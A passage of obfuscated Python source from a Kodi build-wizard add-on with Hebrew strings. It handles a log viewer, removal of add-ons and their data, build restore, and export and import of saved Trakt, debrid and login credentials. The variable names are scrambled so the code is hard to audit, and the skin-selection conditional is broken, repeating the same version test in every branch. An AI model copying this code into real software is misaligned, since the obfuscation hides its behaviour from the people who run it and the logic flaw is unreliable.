		def onInit (O000OO0OOO000OOO0 ):#line:4970
			O000OO0OOO000OOO0 .title =101 #line:4971
			O000OO0OOO000OOO0 .msg =102 #line:4972
			O000OO0OOO000OOO0 .scrollbar =103 #line:4973
			O000OO0OOO000OOO0 .upload =201 #line:4974
			O000OO0OOO000OOO0 .kodi =202 #line:4975
			O000OO0OOO000OOO0 .kodiold =203 #line:4976
			O000OO0OOO000OOO0 .wizard =204 #line:4977
			O000OO0OOO000OOO0 .okbutton =205 #line:4978
			OOOO0OO0OO00O00OO =open (O000OO0OOO000OOO0 .default ,'r')#line:4979
			O000OO0OOO000OOO0 .logmsg =OOOO0OO0OO00O00OO .read ()#line:4980
			OOOO0OO0OO00O00OO .close ()#line:4981
			O000OO0OOO000OOO0 .titlemsg ="%s: %s"%(ADDONTITLE ,O000OO0OOO000OOO0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4982
			O000OO0OOO000OOO0 .showdialog ()#line:4983
		def showdialog (OOOOOOO00000O00OO ):#line:4985
			OOOOOOO00000O00OO .getControl (OOOOOOO00000O00OO .title ).setLabel (OOOOOOO00000O00OO .titlemsg )#line:4986
			OOOOOOO00000O00OO .getControl (OOOOOOO00000O00OO .msg ).setText (wiz .highlightText (OOOOOOO00000O00OO .logmsg ))#line:4987
			OOOOOOO00000O00OO .setFocusId (OOOOOOO00000O00OO .scrollbar )#line:4988
		def onClick (OO0O0O0O00O0O0OOO ,O000O0O0OO0O000OO ):#line:4990
			if O000O0O0OO0O000OO ==OO0O0O0O00O0O0OOO .okbutton :OO0O0O0O00O0O0OOO .close ()#line:4991
			elif O000O0O0OO0O000OO ==OO0O0O0O00O0O0OOO .upload :OO0O0O0O00O0O0OOO .close ();uploadLog .Main ()#line:4992
			elif O000O0O0OO0O000OO ==OO0O0O0O00O0O0OOO .kodi :#line:4993
				OO0000O000O0OO00O =wiz .Grab_Log (False )#line:4994
				O00OOO0OO0OOO00OO =wiz .Grab_Log (True )#line:4995
				if OO0000O000O0OO00O ==False :#line:4996
					OO0O0O0O00O0O0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4997
					OO0O0O0O00O0O0OOO .getControl (OO0O0O0O00O0O0OOO .msg ).setText ("Log File Does Not Exists!")#line:4998
				else :#line:4999
					OO0O0O0O00O0O0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O00OOO0OO0OOO00OO .replace (LOG ,''))#line:5000
					OO0O0O0O00O0O0OOO .getControl (OO0O0O0O00O0O0OOO .title ).setLabel (OO0O0O0O00O0O0OOO .titlemsg )#line:5001
					OO0O0O0O00O0O0OOO .getControl (OO0O0O0O00O0O0OOO .msg ).setText (wiz .highlightText (OO0000O000O0OO00O ))#line:5002
					OO0O0O0O00O0O0OOO .setFocusId (OO0O0O0O00O0O0OOO .scrollbar )#line:5003
			elif O000O0O0OO0O000OO ==OO0O0O0O00O0O0OOO .kodiold :#line:5004
				OO0000O000O0OO00O =wiz .Grab_Log (False ,True )#line:5005
				O00OOO0OO0OOO00OO =wiz .Grab_Log (True ,True )#line:5006
				if OO0000O000O0OO00O ==False :#line:5007
					OO0O0O0O00O0O0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:5008
					OO0O0O0O00O0O0OOO .getControl (OO0O0O0O00O0O0OOO .msg ).setText ("Log File Does Not Exists!")#line:5009
				else :#line:5010
					OO0O0O0O00O0O0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O00OOO0OO0OOO00OO .replace (LOG ,''))#line:5011
					OO0O0O0O00O0O0OOO .getControl (OO0O0O0O00O0O0OOO .title ).setLabel (OO0O0O0O00O0O0OOO .titlemsg )#line:5012
					OO0O0O0O00O0O0OOO .getControl (OO0O0O0O00O0O0OOO .msg ).setText (wiz .highlightText (OO0000O000O0OO00O ))#line:5013
					OO0O0O0O00O0O0OOO .setFocusId (OO0O0O0O00O0O0OOO .scrollbar )#line:5014
			elif O000O0O0OO0O000OO ==OO0O0O0O00O0O0OOO .wizard :#line:5015
				OO0000O000O0OO00O =wiz .Grab_Log (False ,False ,True )#line:5016
				O00OOO0OO0OOO00OO =wiz .Grab_Log (True ,False ,True )#line:5017
				if OO0000O000O0OO00O ==False :#line:5018
					OO0O0O0O00O0O0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:5019
					OO0O0O0O00O0O0OOO .getControl (OO0O0O0O00O0O0OOO .msg ).setText ("Log File Does Not Exists!")#line:5020
				else :#line:5021
					OO0O0O0O00O0O0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O00OOO0OO0OOO00OO .replace (ADDONDATA ,''))#line:5022
					OO0O0O0O00O0O0OOO .getControl (OO0O0O0O00O0O0OOO .title ).setLabel (OO0O0O0O00O0O0OOO .titlemsg )#line:5023
					OO0O0O0O00O0O0OOO .getControl (OO0O0O0O00O0O0OOO .msg ).setText (wiz .highlightText (OO0000O000O0OO00O ))#line:5024
					OO0O0O0O00O0O0OOO .setFocusId (OO0O0O0O00O0O0OOO .scrollbar )#line:5025
		def onAction (O0OO00OOOO000OO00 ,OOOOO00O0OOOO0000 ):#line:5027
			if OOOOO00O0OOOO0000 ==ACTION_PREVIOUS_MENU :O0OO00OOOO000OO00 .close ()#line:5028
			elif OOOOO00O0OOOO0000 ==ACTION_NAV_BACK :O0OO00OOOO000OO00 .close ()#line:5029
	if default ==None :default =wiz .Grab_Log (True )#line:5030
	O00000O000O00OO0O =OOO0OO00O0O0O0OO0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:5031
	O00000O000O00OO0O .doModal ()#line:5032
	del O00000O000O00OO0O #line:5033
def removeAddon (OO0O0O0OOO0O0OOO0 ,OOO0O0O0OO0O0O0OO ,over =False ):#line:5035
	if not over ==False :#line:5036
		OO0O0000OOO0OO000 =1 #line:5037
	else :#line:5038
		OO0O0000OOO0OO000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0O0O0OO0O0O0OO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO0O0O0OOO0O0OOO0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:5039
	if OO0O0000OOO0OO000 ==1 :#line:5040
		OO000OO000O000000 =os .path .join (ADDONS ,OO0O0O0OOO0O0OOO0 )#line:5041
		wiz .log ("Removing Addon %s"%OO0O0O0OOO0O0OOO0 )#line:5042
		wiz .cleanHouse (OO000OO000O000000 )#line:5043
		xbmc .sleep (1000 )#line:5044
		try :shutil .rmtree (OO000OO000O000000 )#line:5045
		except Exception as O0OO0OOOO0OOO00O0 :wiz .log ("Error removing %s"%OO0O0O0OOO0O0OOO0 ,xbmc .LOGNOTICE )#line:5046
		removeAddonData (OO0O0O0OOO0O0OOO0 ,OOO0O0O0OO0O0O0OO ,over )#line:5047
	if over ==False :#line:5048
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OOO0O0O0OO0O0O0OO ))#line:5049
def removeAddonData (OO000000O0O0OO000 ,name =None ,over =False ):#line:5051
	if OO000000O0O0OO000 =='all':#line:5052
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5053
			wiz .cleanHouse (ADDOND )#line:5054
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5055
	elif OO000000O0O0OO000 =='uninstalled':#line:5056
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5057
			O0OO000OOO0OO0OO0 =0 #line:5058
			for O00O00OOOO000O000 in glob .glob (os .path .join (ADDOND ,'*')):#line:5059
				O0OO000O0OO0000O0 =O00O00OOOO000O000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:5060
				if O0OO000O0OO0000O0 in EXCLUDES :pass #line:5061
				elif os .path .exists (os .path .join (ADDONS ,O0OO000O0OO0000O0 )):pass #line:5062
				else :wiz .cleanHouse (O00O00OOOO000O000 );O0OO000OOO0OO0OO0 +=1 ;wiz .log (O00O00OOOO000O000 );shutil .rmtree (O00O00OOOO000O000 )#line:5063
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0OO000OOO0OO0OO0 ))#line:5064
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5065
	elif OO000000O0O0OO000 =='empty':#line:5066
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5067
			O0OO000OOO0OO0OO0 =wiz .emptyfolder (ADDOND )#line:5068
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0OO000OOO0OO0OO0 ))#line:5069
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5070
	else :#line:5071
		O0O000OOO0O00000O =os .path .join (USERDATA ,'addon_data',OO000000O0O0OO000 )#line:5072
		if OO000000O0O0OO000 in EXCLUDES :#line:5073
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:5074
		elif os .path .exists (O0O000OOO0O00000O ):#line:5075
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO000000O0O0OO000 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5076
				wiz .cleanHouse (O0O000OOO0O00000O )#line:5077
				try :#line:5078
					shutil .rmtree (O0O000OOO0O00000O )#line:5079
				except :#line:5080
					wiz .log ("Error deleting: %s"%O0O000OOO0O00000O )#line:5081
			else :#line:5082
				wiz .log ('Addon data for %s was not removed'%OO000000O0O0OO000 )#line:5083
	wiz .refresh ()#line:5084
def restoreit (OOO0O00O00O000OOO ):#line:5086
	if OOO0O00O00O000OOO =='build':#line:5087
		OOOO00O0O0OOOOOO0 =freshStart ('restore')#line:5088
		if OOOO00O0O0OOOOOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:5089
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.Premium.mod']:#line:5090
		wiz .skinToDefault ()#line:5091
	wiz .restoreLocal (OOO0O00O00O000OOO )#line:5092
def restoreextit (O00OO0O0OO00O00O0 ):#line:5094
	if O00OO0O0OO00O00O0 =='build':#line:5095
		OOO000O0000O0OO0O =freshStart ('restore')#line:5096
		if OOO000O0000O0OO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:5097
	wiz .restoreExternal (O00OO0O0OO00O00O0 )#line:5098
def buildInfo (OOOO000000OO0OOO0 ):#line:5100
	if wiz .workingURL (SPEEDFILE )==True :#line:5101
		if wiz .checkBuild (OOOO000000OO0OOO0 ,'url'):#line:5102
			OOOO000000OO0OOO0 ,OOO00OOO000000OO0 ,OO00OOO000OOO0O0O ,OOOOOOOO00O000O0O ,OO0O0O0O0O0OO0000 ,O0O00000OO00O0OO0 ,OO0000000O0O0000O ,OOOOO0O000O00O00O ,OO0OOOOOOOO0000OO ,O0OOO0OOO000OOOOO ,O0O00OOO0O0OO00O0 =wiz .checkBuild (OOOO000000OO0OOO0 ,'all')#line:5103
			O0OOO0OOO000OOOOO ='Yes'if O0OOO0OOO000OOOOO .lower ()=='yes'else 'No'#line:5104
			OO00OOOOO00O00OO0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO000000OO0OOO0 )#line:5105
			OO00OOOOO00O00OO0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO00OOO000000OO0 )#line:5106
			if not O0O00000OO00O0OO0 =="http://":#line:5107
				O0OO000O0OOOO00O0 =wiz .themeCount (OOOO000000OO0OOO0 ,False )#line:5108
				OO00OOOOO00O00OO0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0OO000O0OOOO00O0 ))#line:5109
			OO00OOOOO00O00OO0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O0O0O0O0OO0000 )#line:5110
			OO00OOOOO00O00OO0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOO0OOO000OOOOO )#line:5111
			OO00OOOOO00O00OO0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00OOO0O0OO00O0 )#line:5112
			wiz .TextBox (ADDONTITLE ,OO00OOOOO00O00OO0 )#line:5113
		else :wiz .log ("Invalid Build Name!")#line:5114
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5115
def buildVideo (O0OOO00OOO0OOOO0O ):#line:5117
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:5118
	if wiz .workingURL (SPEEDFILE )==True :#line:5119
		OO000OOO0O0000OOO =wiz .checkBuild (O0OOO00OOO0OOOO0O ,'preview')#line:5120
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0OOO00OOO0OOOO0O )#line:5121
		if OO000OOO0O0000OOO and not OO000OOO0O0000OOO =='http://':playVideo (OO000OOO0O0000OOO )#line:5122
		else :wiz .log ("[%s]Unable to find url for video preview"%O0OOO00OOO0OOOO0O )#line:5123
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5124
def dependsList (O0000O0OO000OOOO0 ):#line:5126
	OO0O0000OO00OO000 =os .path .join (ADDONS ,O0000O0OO000OOOO0 ,'addon.xml')#line:5127
	if os .path .exists (OO0O0000OO00OO000 ):#line:5128
		OO00O0O0OO00OO000 =open (OO0O0000OO00OO000 ,mode ='r');O00OOO0000OOO00OO =OO00O0O0OO00OO000 .read ();OO00O0O0OO00OO000 .close ();#line:5129
		OOO0OOO0O0O0OO0OO =wiz .parseDOM (O00OOO0000OOO00OO ,'import',ret ='addon')#line:5130
		OO0OO0O000O0OOOO0 =[]#line:5131
		for O0OOOOO000O0OOOOO in OOO0OOO0O0O0OO0OO :#line:5132
			if not 'xbmc.python'in O0OOOOO000O0OOOOO :#line:5133
				OO0OO0O000O0OOOO0 .append (O0OOOOO000O0OOOOO )#line:5134
		return OO0OO0O000O0OOOO0 #line:5135
	return []#line:5136
def manageSaveData (O0O000O0O00000O0O ):#line:5138
	if O0O000O0O00000O0O =='import':#line:5139
		OOOOO0OOOO00OO000 =os .path .join (ADDONDATA ,'temp')#line:5140
		if not os .path .exists (OOOOO0OOOO00OO000 ):os .makedirs (OOOOO0OOOO00OO000 )#line:5141
		O0OOOOOOOOOO000O0 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:5142
		if not O0OOOOOOOOOO000O0 .endswith ('.zip'):#line:5143
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:5144
			return #line:5145
		O000O00O0OOOO00O0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:5146
		O0OO0OOOO00000OO0 =xbmcvfs .copy (O0OOOOOOOOOO000O0 ,O000O00O0OOOO00O0 )#line:5147
		wiz .log ("%s"%str (O0OO0OOOO00000OO0 ))#line:5148
		extract .all (xbmc .translatePath (O000O00O0OOOO00O0 ),OOOOO0OOOO00OO000 )#line:5149
		O00OOOOOOO0O0OO00 =os .path .join (OOOOO0OOOO00OO000 ,'trakt')#line:5150
		O0OOOO00OOOOOO000 =os .path .join (OOOOO0OOOO00OO000 ,'login')#line:5151
		OO0OOO00OOO0OOOOO =os .path .join (OOOOO0OOOO00OO000 ,'debrid')#line:5152
		OO00O0O00000000OO =0 #line:5153
		if os .path .exists (O00OOOOOOO0O0OO00 ):#line:5154
			OO00O0O00000000OO +=1 #line:5155
			O00OOO0O000O00000 =os .listdir (O00OOOOOOO0O0OO00 )#line:5156
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:5157
			for O000O0OO000O0O000 in O00OOO0O000O00000 :#line:5158
				OOO000O00O0OOOO00 =os .path .join (traktit .TRAKTFOLD ,O000O0OO000O0O000 )#line:5159
				O0OOO000O0O00OO0O =os .path .join (O00OOOOOOO0O0OO00 ,O000O0OO000O0O000 )#line:5160
				if os .path .exists (OOO000O00O0OOOO00 ):#line:5161
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000O0OO000O0O000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5162
					else :os .remove (OOO000O00O0OOOO00 )#line:5163
				shutil .copy (O0OOO000O0O00OO0O ,OOO000O00O0OOOO00 )#line:5164
			traktit .importlist ('all')#line:5165
			traktit .traktIt ('restore','all')#line:5166
		if os .path .exists (O0OOOO00OOOOOO000 ):#line:5167
			OO00O0O00000000OO +=1 #line:5168
			O00OOO0O000O00000 =os .listdir (O0OOOO00OOOOOO000 )#line:5169
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:5170
			for O000O0OO000O0O000 in O00OOO0O000O00000 :#line:5171
				OOO000O00O0OOOO00 =os .path .join (loginit .LOGINFOLD ,O000O0OO000O0O000 )#line:5172
				O0OOO000O0O00OO0O =os .path .join (O0OOOO00OOOOOO000 ,O000O0OO000O0O000 )#line:5173
				if os .path .exists (OOO000O00O0OOOO00 ):#line:5174
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000O0OO000O0O000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5175
					else :os .remove (OOO000O00O0OOOO00 )#line:5176
				shutil .copy (O0OOO000O0O00OO0O ,OOO000O00O0OOOO00 )#line:5177
			loginit .importlist ('all')#line:5178
			loginit .loginIt ('restore','all')#line:5179
		if os .path .exists (OO0OOO00OOO0OOOOO ):#line:5180
			OO00O0O00000000OO +=1 #line:5181
			O00OOO0O000O00000 =os .listdir (OO0OOO00OOO0OOOOO )#line:5182
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:5183
			for O000O0OO000O0O000 in O00OOO0O000O00000 :#line:5184
				OOO000O00O0OOOO00 =os .path .join (debridit .REALFOLD ,O000O0OO000O0O000 )#line:5185
				O0OOO000O0O00OO0O =os .path .join (OO0OOO00OOO0OOOOO ,O000O0OO000O0O000 )#line:5186
				if os .path .exists (OOO000O00O0OOOO00 ):#line:5187
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000O0OO000O0O000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5188
					else :os .remove (OOO000O00O0OOOO00 )#line:5189
				shutil .copy (O0OOO000O0O00OO0O ,OOO000O00O0OOOO00 )#line:5190
			debridit .importlist ('all')#line:5191
			debridit .debridIt ('restore','all')#line:5192
		wiz .cleanHouse (OOOOO0OOOO00OO000 )#line:5193
		wiz .removeFolder (OOOOO0OOOO00OO000 )#line:5194
		os .remove (O000O00O0OOOO00O0 )#line:5195
		if OO00O0O00000000OO ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:5196
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:5197
	elif O0O000O0O00000O0O =='export':#line:5198
		O0000OO00O0OO0O00 =xbmc .translatePath (MYBUILDS )#line:5199
		OO0OOOOOOO0OOOO00 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:5200
		traktit .traktIt ('update','all')#line:5201
		loginit .loginIt ('update','all')#line:5202
		debridit .debridIt ('update','all')#line:5203
		O0OOOOOOOOOO000O0 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:5204
		O0OOOOOOOOOO000O0 =xbmc .translatePath (O0OOOOOOOOOO000O0 )#line:5205
		OO000O00OOOO0OO0O =os .path .join (O0000OO00O0OO0O00 ,'SaveData.zip')#line:5206
		OO0OO0O00O0OO000O =zipfile .ZipFile (OO000O00OOOO0OO0O ,mode ='w')#line:5207
		for OOOO0OO0OOO0OO0OO in OO0OOOOOOO0OOOO00 :#line:5208
			if os .path .exists (OOOO0OO0OOO0OO0OO ):#line:5209
				O00OOO0O000O00000 =os .listdir (OOOO0OO0OOO0OO0OO )#line:5210
				for OO0O0000OOO00OOO0 in O00OOO0O000O00000 :#line:5211
					OO0OO0O00O0OO000O .write (os .path .join (OOOO0OO0OOO0OO0OO ,OO0O0000OOO00OOO0 ),os .path .join (OOOO0OO0OOO0OO0OO ,OO0O0000OOO00OOO0 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:5212
		OO0OO0O00O0OO000O .close ()#line:5213
		if O0OOOOOOOOOO000O0 ==O0000OO00O0OO0O00 :#line:5214
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000O00OOOO0OO0O ))#line:5215
		else :#line:5216
			try :#line:5217
				xbmcvfs .copy (OO000O00OOOO0OO0O ,os .path .join (O0OOOOOOOOOO000O0 ,'SaveData.zip'))#line:5218
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0OOOOOOOOOO000O0 ,'SaveData.zip')))#line:5219
			except :#line:5220
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000O00OOOO0OO0O ))#line:5221
def freshStart (install =None ,over =False ):#line:5226
	if USERNAME =='':#line:5227
		ADDON .openSettings ()#line:5228
		sys .exit ()#line:5229
	O0OO00O0OOOOOO0O0 =(SPEEDFILE )#line:5230
	(O0OO00O0OOOOOO0O0 )#line:5231
	O0O000OO00000O0O0 =(wiz .workingURL (O0OO00O0OOOOOO0O0 ))#line:5232
	(O0O000OO00000O0O0 )#line:5233
	if KEEPTRAKT =='true':#line:5234
		traktit .autoUpdate ('all')#line:5235
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:5236
	if KEEPREAL =='true':#line:5237
		debridit .autoUpdate ('all')#line:5238
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:5239
	if KEEPLOGIN =='true':#line:5240
		loginit .autoUpdate ('all')#line:5241
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:5242
	if over ==True :O0O0OOOO0O000OO00 =1 #line:5243
	elif install =='restore':O0O0OOOO0O000OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5244
	elif install :O0O0OOOO0O000OO00 =1 #line:5245
	else :O0O0OOOO0O000OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5246
	if O0O0OOOO0O000OO00 :#line:5247
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5248
			OOO0000O00OOO0O0O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:5249
			skinSwitch .swapSkins (OOO0000O00OOO0O0O )#line:5252
			O0OOO000OOOOOO0OO =0 #line:5253
			xbmc .sleep (1000 )#line:5254
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOO000OOOOOO0OO <150 :#line:5255
				O0OOO000OOOOOO0OO +=1 #line:5256
				xbmc .sleep (1000 )#line:5257
				wiz .ebi ('SendAction(Select)')#line:5258
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:5259
				wiz .ebi ('SendClick(11)')#line:5260
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:5261
			xbmc .sleep (1000 )#line:5262
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5263
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:5264
			return #line:5265
		wiz .addonUpdates ('set')#line:5266
		OOOOO0OOOOOOOOOOO =os .path .abspath (HOME )#line:5267
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:5268
		OO000OOOOO0O0OO0O =sum ([len (O0O0000OO000O0OOO )for OO0OOOO00000OO00O ,O0OOO0O000O00OOOO ,O0O0000OO000O0OOO in os .walk (OOOOO0OOOOOOOOOOO )]);O0OO000O0OOO0OO0O =0 #line:5269
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:5270
		EXCLUDES .append ('My_Builds')#line:5271
		EXCLUDES .append ('archive_cache')#line:5272
		EXCLUDES .append ('script.module.requests')#line:5273
		EXCLUDES .append ('myfav.anon')#line:5274
		if KEEPREPOS =='true':#line:5275
			O0OOOOO00OO0OO000 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:5276
			for O0OOO0OO0000OO0OO in O0OOOOO00OO0OO000 :#line:5277
				OO0OO0000OO00000O =os .path .split (O0OOO0OO0000OO0OO [:-1 ])[1 ]#line:5278
				if not OO0OO0000OO00000O ==EXCLUDES :#line:5279
					EXCLUDES .append (OO0OO0000OO00000O )#line:5280
		if KEEPSUPER =='true':#line:5281
			EXCLUDES .append ('plugin.program.super.favourites')#line:5282
		if KEEPMOVIELIST =='true':#line:5283
			EXCLUDES .append ('plugin.video.metalliq')#line:5284
		if KEEPMOVIELIST =='true':#line:5285
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:5286
		if KEEPADDONS =='true':#line:5287
			EXCLUDES .append ('addons')#line:5288
		if KEEPTELEMEDIA =='true':#line:5289
			EXCLUDES .append ('plugin.video.telemedia')#line:5290
		EXCLUDES .append ('plugin.video.elementum')#line:5295
		EXCLUDES .append ('script.elementum.burst')#line:5296
		EXCLUDES .append ('script.elementum.burst-master')#line:5297
		EXCLUDES .append ('plugin.video.quasar')#line:5298
		EXCLUDES .append ('script.quasar.burst')#line:5299
